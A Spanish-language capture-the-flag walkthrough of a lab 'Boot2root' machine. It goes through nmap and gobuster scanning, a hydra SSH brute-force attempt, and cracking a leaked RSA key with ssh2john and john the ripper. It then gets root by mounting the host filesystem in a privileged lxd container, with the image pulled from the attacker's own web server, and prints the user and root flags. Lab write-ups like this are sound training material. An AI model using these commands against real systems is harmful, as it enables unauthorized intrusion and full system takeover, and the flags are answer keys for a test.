# 1. Boot2root

¿Puedes acceder a este servidor de juegos creado por aficionados sin experiencia en desarrollo web y aprovechar el sistema de implementación?

## a) ¿Cuál es la flag de usuario?

Comenzamos haciendo un escaneo nmap básico para conocer los puertos abiertos y los servicios. Usamos:

```
nmap -sV -T5 10.10.74.15
```

Lo que nos muestra los puertos 22 y 80 abiertos, un servicio SSH y un servidor web Apache.

![](IMG/Pasted%20image%2020250416010821.png)

Echamos un vistazo a la página web, que parece ser una web de juegos de rol.

![](IMG/Pasted%20image%2020250416010929.png)

En el código fuente de la página principal, encontramos un comentario que se trata de un mensaje para un tal "john", en el que le indican que cambie el contenido de la página.

![](IMG/Pasted%20image%2020250416011109.png)

Seguimos buscando por la página y no parece tener mucho contenido, lo único interesante es un botón con el nombre "Uploads".

![](IMG/Pasted%20image%2020250416011213.png)

si accedemos a dicho botón nos muestra los archivos que se han subido. los descargaremos para ver el contenido en busca de alguna pista.

![](IMG/Pasted%20image%2020250416011436.png)

El archivo dict.lst parece ser una especie de diccionario de contraseñas.

![](IMG/Pasted%20image%2020250416011543.png)

El siguiente archivo "manifesto.txt" es un texto que aparentemente no nos aporta nada útil.

![](IMG/Pasted%20image%2020250416011735.png)

Y la imagen "meme.jpg", parece ser eso, un simple meme, si mas adelante no encuentro nada más, la analizaré en busca de algo oculto con esteganografía.

![](IMG/Pasted%20image%2020250416011852.png)

miro por si hubiera un archivo robots.txt, y lo hay, pero en el solo nos dice que está permitido el acceso a un directorio llamado /uploads/ que es el que ya conocemos.

![](IMG/Pasted%20image%2020250416012344.png)

Como ya tenemos un posible diccionario, y un posible nombre de usuario (john, el que aparecía en el código fuente de la página), probaré a conectarme por SSH haciendo fuerza bruta con ese diccionario usando hydra.

```
hydra -l john -P dict.lst 10.10.74.15 ssh
```

Y, no hemos tenido suerte.

![](IMG/Pasted%20image%2020250416012554.png)

Así que buscaré si hay mas directorios en la web con Gobuster, si no los hay, tiraremos por la opción de analizar la imagen del meme.

```
gobuster dir -u http://10.10.74.15 -w /usr/share/dirb/wordlists/common.txt
```

Bien ademas de los directorios que ya conocíamos, ahora vemos que hay otro directorio llamado /secret, el nombre es sospechoso de ocultar algún secreto al menos.

![](IMG/Pasted%20image%2020250416012849.png)

Al acceder a el, encontramos un archivo llamado "secretKey".

![](IMG/Pasted%20image%2020250416012935.png)

Es una clave RSA. quizás podamos conectarnos por SSH usando esta clave. La descargaremos y probaremos. (la guardamos en un fichero y le daremos permisos con chmod 400, ya que si le damos demasiados permisos la denegará)

![](IMG/Pasted%20image%2020250416013014.png)

Probamos a conectar usando la clave.

```
ssh -i secretKey john@10.10.74.15
```

Y, parece ser que el archivo de la clave tiene contraseña

![](IMG/Pasted%20image%2020250416013801.png)

Probamos a usar john the ripper con el diccionario que antes no nos sirvió, por si diera la casualidad de que el diccionario fuera para este archivo. Primero convertimos el archivo con la clave al formato para que john the ripper pueda usarla.

```
ssh2john secretKey.txt > gaminghash
```

y, una vez convertida al formato, ejecutamos john the ripper, lo cual nos da como resultado la contraseña para el archivo de la clave.

![](IMG/Pasted%20image%2020250416014543.png)

Volvemos a intentar conectarnos por SSH usando el archivo de clave RSA.

```
ssh -i secretKey.txt john@10.10.74.15
```

Y, ahora sí, hemos podido conectarnos correctamente.

![](IMG/Pasted%20image%2020250416014651.png)

Ya conectados, buscaremos el archivo con la flag de usuario (user.txt) y lo abriremos.

![](IMG/Pasted%20image%2020250416014812.png)

**Respuesta: a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e**

## b) Cuál es la flag de root?

En este punto, no sabía ya por donde tirar, así que buscando por internet, entre alguna guía, pistas, un poco de aquí y de allí...

La pista nos la dan con los grupos a los que pertenece el usuario john, el cual pertenece, entre otros, al grupo "lxd"

![](IMG/Pasted%20image%2020250416023319.png)

LXD, es un gestor de contenedores de Linux, y por lo visto, aprovechar una vulnerabilidad de este servicio es la forma que tenemos para explotar esta máquina. Crearemos un contenedor que será el que nos proporcione el acceso root. Podemos ver la explicación y el proceso en este [enlace](https://www.hackingarticles.in/lxd-privilege-escalation/)

Lo primero que haremos será descargar lo necesario para crear el contenedor, de [aquí](https://github.com/saghul/lxd-alpine-builder) (podríamos hacerlo desde la máquina objetivo, pero como en nuestro caso no tiene conexión a internet, lo descargaremos en nuestra máquina y lo pasaremos con un servidor web sencillo.)

![](IMG/Pasted%20image%2020250416024934.png)

Una vez descargado, desde el directorio donde está descargado iniciamos un servidor web.

```
sudo python3 -m http.server 80
```

![](IMG/Pasted%20image%2020250416025124.png)

Y solicitamos el archivo desde la máquina objetivo.

```
wget http://10.8.16.0:80/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

![](IMG/Pasted%20image%2020250416025316.png)

Ahora importamos la imagen, asignandole un alias para que sea mas fácil su uso.

```
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias gaming
```

![](IMG/Pasted%20image%2020250416025448.png)

Una vez importada, iniciamos la imagen:

```
lxc init gaming gg -c security.privileged=true
```

![](IMG/Pasted%20image%2020250416025610.png)

Ahora, añadimos el directorio raíz de la máquina objetivo con todo su contenido en la imagen.

```
lxc config device add gg mydevice disk source=/ path=/mnt/root recursive=true
```

![](IMG/Pasted%20image%2020250416025750.png)

Iniciamos el contenedor creado y una vez iniciado, iniciamos en el una terminal bash

```
lxc start gg
lxc exec gg /bin/sh
```

![](IMG/Pasted%20image%2020250416025921.png)

Y veremos que somos usuario root.

![](IMG/Pasted%20image%2020250416025947.png)

Ahora solo tenemos que buscar la ruta donde está el archivo root.txt y abrirlo.

![](IMG/Pasted%20image%2020250416030103.png)

**Respuesta: 2e337b8c9f3aff0c2b3e8d4e6a7c88fc**